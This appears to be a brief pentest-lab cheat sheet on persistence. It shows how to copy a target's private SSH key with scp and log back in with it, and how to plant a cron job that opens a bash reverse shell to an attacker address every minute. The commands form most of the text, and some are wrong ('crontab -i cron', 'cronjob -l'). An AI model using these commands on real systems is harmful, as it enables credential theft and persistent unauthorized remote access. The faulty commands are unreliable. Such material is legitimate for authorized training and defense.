<h4>Persistence via ssh keys</h4>

To download the file from the target machine
```
scp student@192.168.123.3:~/.ssh/id_rsa .
```
Give the private key permission
```
chmod 400 id_rsa
```
Logging in back with the id_rsa
```
ssh student@192.168.123.3 -i id_rsa
```



<h4>Persistence via cronjobs</h4>

>To create a cronjob, a simple cron file has to be created and added and to the crontab

creating the cron file
```
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.123.2/1234 0>&1'" > cron
```
Now, this will run everytime since there are 5 astericks.

To add the cronjob
```
crontab -i cron
```
To view the list of cronjobs
```
cronjob -l
```
